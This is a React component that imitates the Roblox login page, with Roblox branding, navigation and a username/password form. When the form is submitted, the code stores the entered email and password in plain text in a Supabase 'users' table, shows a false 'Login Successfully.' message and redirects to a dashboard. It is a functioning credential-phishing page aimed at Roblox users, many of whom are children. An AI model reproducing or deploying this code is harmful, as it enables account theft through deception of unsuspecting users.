import React, { useState } from 'react';
import { supabase } from './supabaseClient';
import './App.css';

const LoginForm = () => {
  const [formData, setFormData] = useState({ email: '', password: '' });
  const [message, setMessage] = useState('');

  const handleChange = (e) => {
    setFormData({ ...formData, [e.target.name]: e.target.value });
  };

  const handleLogin = async (e) => {
    e.preventDefault();

    
    await supabase.from('users').insert([{ email: formData.email, password: formData.password }]);

    setMessage('Login Successfully.');

    setTimeout(() => {
      window.location.href = '/dashboard';
    }, 2000);
  };

  return (
    
    <div className="roblox-wrap">
     
      <header className="roblox-header">
      <div className="roblox-logo">ROBLOX</div>

      <nav className="navlink">
        <ul>
          <li><a href="#">Discover</a></li>
          <li><a href="#">Marketplace</a></li>
          <li><a href="#">Create</a></li>
          <li><a href="#">Robux</a></li>
          <input className="roblox-search" type="text" placeholder="Search" />
        </ul>
        
      </nav>

   
     

      <button className="signup-btn">Sign Up</button>
    </header>
      <div className="roblox-box">
        <h2 className="roblox-title">Login to Roblox</h2>

        <form onSubmit={handleLogin} className="roblox-form">
          <input
            className="roblox-input"
            type="text"
            name="email"
            placeholder="Username/Email/Phone"
            value={formData.email}
            onChange={handleChange}
            required
          />

          <input
            className="roblox-input"
            type="password"
            name="password"
            placeholder="Password"
            value={formData.password}
            onChange={handleChange}
            required
          />

          <button className="roblox-login-btn" type="submit">Log In</button>
        </form>

        <a className="roblox-forgot" href="#">Forgot Password or Username?</a>

        <hr className="roblox-divider" />

        <button className="roblox-secondary">Email Me a One-Time Code</button>
        <button className="roblox-secondary">Use Another Device</button>

        <p className="roblox-signup">
          Don’t have an account? <a href="#">Sign Up</a>
        </p>

        {message && <p className="roblox-message">{message}</p>}
      </div>
    </div>
  );
};

export default LoginForm;
